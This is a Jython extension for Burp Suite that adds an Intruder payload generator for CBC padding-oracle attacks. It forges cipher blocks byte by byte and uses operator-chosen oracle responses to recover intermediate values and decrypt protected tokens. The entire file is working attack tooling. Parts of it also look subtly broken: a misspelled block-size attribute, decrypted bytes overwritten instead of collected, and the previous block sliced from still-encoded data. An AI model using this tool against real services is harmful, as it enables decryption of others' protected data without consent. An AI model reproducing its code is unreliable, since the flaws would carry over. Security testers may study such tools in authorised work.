from base64 import b64decode, b64encode
from javax.swing import JOptionPane
from java.awt import Dialog
from burp import *
import array
import logging
import codecs


log = logging.getLogger(__name__)


class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    BLOCK_SIZE = 16
    DECODERS = ('base64',)
    ENCODERS = ('base64',)

    @staticmethod
    def decode(val):
        if isinstance(val, array.array):
            val = val.tostring()
        for codec in BurpExtender.DECODERS:
            val = codecs.decode(val, codec)
        return val

    @staticmethod
    def encode(val):
        if isinstance(val, array.array):
            val = val.tostring()
        if not isinstance(val, unicode):  # required for jython
            val = val.decode('unicode_escape')

        for codec in BurpExtender.ENCODERS:
            val = codecs.encode(val, codec)
            if 'base64' in codec:
                val = val.strip()
        return val

    def registerExtenderCallbacks(self, cb):
        self.callbacks = cb

        cb.registerIntruderPayloadGeneratorFactory(self)

    def getGeneratorName(self):
        return "PaddingOracle"

    def createNewInstance(self, attack):
        log.info("Creating new Payload Generator instance")
        self.callbacks.getStdout().write("Starting intruder\n")
        PaddingOraclePayloads.encode = staticmethod(BurpExtender.encode)
        PaddingOraclePayloads.decode = staticmethod(BurpExtender.decode)
        PaddingOraclePayloads.BLOCk_SIZE = BurpExtender.BLOCK_SIZE
        return PaddingOraclePayloads(self.callbacks)


class PaddingOraclePayloads(IIntruderPayloadGenerator):
    BLOCK_SIZE = 16

    decode = b64decode
    encode = b64encode

    def __init__(self, cb):
        self.reset()
        self.callbacks = cb

    def hasMorePayloads(self):
        return self.baseValue is None or (self.current_block >= 0 and
                                          self.position >= 0)

    def getNextPayload(self, baseValue):
        log.debug("Requesting payload %r", baseValue)
        decoded = PaddingOraclePayloads.decode(baseValue)
        if self.baseValue is None:  # first payload request
            self.baseValue = baseValue
            self.position = self.BLOCK_SIZE - 1
            self.total_blocks = len(decoded) / self.BLOCK_SIZE
            self.current_block = self.total_blocks - 1
            self.decrypted = ""
            self.IV = [0] * self.BLOCK_SIZE
            log.info("Starting new Payload queue: %s %d", baseValue, self.total_blocks)

        # init payload
        prefix = ["\0"] * self.BLOCK_SIZE
        
        # set current value
        prefix[self.position] = chr(self.current_value)

        # set padding for already decrypted bytes
        for i in range(self.position, self.BLOCK_SIZE-1):
            prefix[i] = chr((self.IV[i] ^ (self.BLOCK_SIZE-self.position)) & 0xFF)

        payload = "".join(prefix) + decoded[self.current_block*self.BLOCK_SIZE:(self.current_block+1)*16]

        self.current_value += 1
        if self.current_value > 255:
            # ask for correct padding
            values = [i for i in range(256*(self.BLOCK_SIZE-1-self.position)+1,
                                       256*(self.BLOCK_SIZE - self.position))]
            pane = JOptionPane("Select succeeded request",
                               JOptionPane.QUESTION_MESSAGE)
            pane.setSelectionValues(values)
            pane.setInitialValue(values[0])
            dialog = pane.createDialog(None, "Padding Oracle")
            dialog.setModalityType(Dialog.ModalityType.DOCUMENT_MODAL)
            dialog.setVisible(True)

            # normalize value
            result = int(pane.getInputValue()) - (
                    256*(self.BLOCK_SIZE - 1 - self.position) - 1)

            # calculate IV = value ^ padding
            iv = (result ^ (self.BLOCK_SIZE-self.position)) & 0xFF

            # store iv 
            self.IV[self.position] = iv
            log.info("Value: %d\nPadding: 0x%0x\nIV: 0x%0x",
                     result,
                     self.BLOCK_SIZE - self.position,
                     iv)
            self.callbacks.getStdout().write("Value: %d\nPadding: 0x%0x\nIV: 0x%0x\n" % (result, self.BLOCK_SIZE-self.position, iv))

            # get previous block
            last_block = self.baseValue[(self.current_block-1)*self.BLOCK_SIZE:
                                        self.current_block*self.BLOCK_SIZE]

            # decrypt block byte = IV ^ previous block
            self.decrypted = chr((iv ^ last_block[self.position]) & 0xFF)
            log.info("Decrypted: %r", self.decrypted)
            self.callbacks.getStdout().write("Decrypted: %r\n" % self.decrypted)
            self.position -= 1
            self.current_value = 0

        if self.position < 0:
            self.current_block -= 1
            self.position = self.BLOCK_SIZE - 1

        # encode payload
        payload = array.array('b', PaddingOraclePayloads.encode(payload))
        return payload

    def reset(self):
        self.baseValue = None
        self.position = None
        self.current_block = None
        self.total_blocks = None
        self.current_value = 0
        self.decrypted = None
        self.IV = None
